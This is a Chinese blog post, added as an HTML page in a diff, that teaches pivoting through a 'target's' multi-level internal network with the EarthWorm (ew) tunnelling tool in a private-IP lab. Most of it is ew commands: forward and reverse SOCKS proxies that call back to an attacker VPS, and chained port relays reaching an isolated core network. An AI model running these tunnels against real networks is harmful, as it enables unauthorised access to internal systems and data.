@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="0x01 ew 快速穿透目标多级内网:
+简要环境说明:123win2008R2 假设为目标边界web服务器,可正常访问公网假设其公网ip为 192.168.3.23假设其内网ip为 192.168.32.131
+12win2008 假设为目标内网数据库服务器,可正常访问公网假设其内网ip为 192.168.32.170
+12win7 假设为自己公网的vps假设其公网ip为 192.168.3.232
+12centos 5.1 假设为目标内网的一台linux机器,没有dns不能访问公网假设其内网ip为 192.168.32.169
+0x02 首先,利用ew做最简单的正向代理,其实就是大家最常用的所谓的ss:
+在 win2008R2 机器上执行1# ew_for_Win.exe -s ssocksd -l 1080
+在win7上打开Proxifier根据上面监听的端口建立正常的socks代理即可">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="John Doe">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="利用 ew 轻松穿透目标多级内网"/>
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="APT404-不疯不魔怎么活"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>利用 ew 轻松穿透目标多级内网 - APT404-不疯不魔怎么活</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/08/06/ew-tunnel/">
+                利用 ew 轻松穿透目标多级内网
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-08-06</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/ew/">ew</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>0x01 ew 快速穿透目标多级内网:</p>
+<p>简要环境说明:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">win2008R2 假设为目标边界web服务器,可正常访问公网</span><br><span class="line">假设其公网ip为 192.168.3.23</span><br><span class="line">假设其内网ip为 192.168.32.131</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">win2008 假设为目标内网数据库服务器,可正常访问公网</span><br><span class="line">假设其内网ip为 192.168.32.170</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">win7 假设为自己公网的vps</span><br><span class="line">假设其公网ip为 192.168.3.232</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">centos 5.1 假设为目标内网的一台linux机器,没有dns不能访问公网</span><br><span class="line">假设其内网ip为 192.168.32.169</span><br></pre></td></tr></table></figure>
+<p>0x02 首先,利用ew做最简单的正向代理,其实就是大家最常用的所谓的ss:</p>
+<p>在 win2008R2 机器上执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ew_for_Win.exe -s ssocksd -l 1080</span><br></pre></td></tr></table></figure></p>
+<p>在win7上打开Proxifier根据上面监听的端口建立正常的socks代理即可<br><a id="more"></a></p>
+<p>0x03 假设目标机器就直接处在内网[没有公网ip,但可以访问公网],我们也可以利用ew进行反向socks5代理,然后直接在vps上就可以很方便的访问目标内网中的所有机器了:</p>
+<p>先在 win7上执行,等待目标反弹连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ew_for_Win.exe -s rcsocks -l 1080 -e 1234</span><br></pre></td></tr></table></figure></p>
+<p>在 win2008上执行,反弹socks5连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ew_for_Win.exe -s  rssocks -d 192.168.3.232 -e 1234</span><br></pre></td></tr></table></figure></p>
+<p>0x04 实现复杂内网环境下的跨网段多级穿透:</p>
+<p>第一种场景,内网机器不能访问公网,可通过能访问公网的机器把内网不能访问公网机器带出来,比较简单,如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">假设win2008处在目标内网且不能访问公网但可以访问内网中的资源</span><br><span class="line">而win2008R2这台机器上虽然有内网ip,但不能访问内网资源,好在win2008R2可以访问win2008</span><br><span class="line">这时我们想获取内网资源就可以这样干,先在win2008上开启socks代理服务,然后再在DMZ的win2008R2连上内网的win2008的socks服务</span><br><span class="line">最后,通过win2008上的socks服务我们就可以轻松访问目标内网中的各种资源了,具体实现过程如下</span><br></pre></td></tr></table></figure></p>
+<p>首先,在win2008上执行,意思就是在本地建立socks5代理,端口为1080<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ew_for_Win.exe -s ssocksd -l 1080</span><br></pre></td></tr></table></figure></p>
+<p>在到DMZ的win2008R2上执行,意思就是把来自外部的1090端口的流量转到内网192.168.32.170这台机器的1080端口上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ew_for_Win.exe -s lcx_tran -l 1090 -f 192.168.32.170 -g 1080</span><br></pre></td></tr></table></figure></p>
+<p>最后,再回到win7[vps]上去利用Proxifier建立正常的socks代理访问1090端口即可,访问vps的1090就相当于访问内网win2008的1080端口</p>
+<p>第二种场景,还是有些机器不能访问公网的情况:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">假设win2008在内网且能访问公网但不能访问内网资源,而centos 5.1能访问内网资源但却无法访问公网,而win2008可以访问centos 5.1</span><br><span class="line">这试,我们要想获取内网资源,就可以通过win2008在centos 5.1和win7[vps]之间建立一条socks5通道,实现过程比较简单,如下</span><br></pre></td></tr></table></figure></p>
+<p>首先,在win7[实际中的vps]上执行,把来自外部的1080端口的流量转到本地的1379端口上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ew_for_Win.exe -s lcx_listen -l 1080 -e 1379</span><br></pre></td></tr></table></figure></p>
+<p>此时回到centos 5.1上执行,在本地启动socks5代理并监听2345端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># chmod +x ew_for_Linux32</span><br><span class="line"># ./ew_for_Linux32 -s ssocksd -l 2345</span><br></pre></td></tr></table></figure></p>
+<p>然后再到win2008上去执行,意思就是把win7[vps]的1379端口和centos 5.1的2345进行绑定,即建立socks5通道<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ew_for_Win.exe -s lcx_slave -d 192.168.3.232 -e 1379 -f 192.168.32.169 -g 2345</span><br></pre></td></tr></table></figure></p>
+<p>最后,在回到win7[vps]建立正常的socks代理访问即可,实际上就相当于访问win7的1080就相当于访问centos 5.1的2345端口,通过这种方式一样也可以把整个目标内网代理出来</p>
+<p>第三种场景,多级内网轻松穿透:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">假设win2008R2在内网[无公网ip]并在一个独立的内网段,win2008也处在目标内网,假设在另一个内网段,centos 5.1同样也处在内网,可又在另一个单独的内网段</span><br><span class="line">且win2008R2能访问win2008,win2008能访问centos 5.1,而centos 5.1能访问目标核心网,要实现层层穿透,访问到核心网资源,我们就可以这样</span><br></pre></td></tr></table></figure></p>
+<p>先在win7[vps]上执行,把来自外部的1080端口流量转到本地的1235端口上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ew_for_Win.exe -s rcsocks -l 1080 -e 1235</span><br></pre></td></tr></table></figure></p>
+<p>在win2008R2上执行,把win7[vps]的1235端口和内网win2008的3456端口绑定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ew_for_Win.exe -s lcx_slave -d 192.168.3.232 -e 1235 -f 192.168.32.170 -g 3456</span><br></pre></td></tr></table></figure></p>
+<p>在win2008上执行,将来自外部的1236端口和本地的3456端口进行绑定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ew_for_Win.exe -s lcx_listen -l 3456 -e 1236</span><br></pre></td></tr></table></figure></p>
+<p>在centos 5.1上执行,将本地的socks连接反弹到win2008的1236端口上,此时再回到win2008上看会提示”rssocks cmd_socket OK!”,说明通道已经建立成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ./ew_for_Linux32 -s rssocks -d 192.168.32.170 -e 1236</span><br></pre></td></tr></table></figure></p>
+<p>最后,再回到win7[vps]上利用Proxifier访问本地的1080就相当于访问centos 5.1的1236端口,即可轻松获取核心网的数据</p>
+<p><br><br>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于ew,想必经常搞内网的朋友,都已经非常熟练了,这里也就不废话了,其实,关于ew本身在实战中还是比较实用的,在此也非常感谢作者的无私贡献,真心希望国内能多一些这样的人,总体来讲,在工具使用上并没有太多技术含量,关键还是要你自己根据目标的实际内网环境仔细弄清楚数据流向再针对性的用,上面一些简单应用场景中,表面看着貌似挺复杂的,其实真正理解以后,都非常简单,深刻搞清楚这些最基本的东西你才有可能灵活应用,什么都是如此,总是停留在’用’别人的工具上,自己没有一点儿的独立分析和想法,是很难有长进的,后续有空会再简单介绍下关于Termite跳板机使用</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/ew/">#ew</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2018/01/01/after-roding/">关于接下来的路</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/12/29/cobalt-strike-spawn/">灵活使用 cobalt strike 的 `spa</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/12/29/cobalt-strike-dns/">对 Cobalt Strike DNS隧道的理解与</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/12/27/powershell-pic-execute/">通过图片免杀执行远程powershell代码</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/privilege/">privilege</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/hash-crack/">hash crack</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/LaZagne/">LaZagne</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/python-basic/">python basic</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.instagram.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://dribbble.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://plus.google.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-google-plus"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.behance.net/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://500px.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:test@example.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
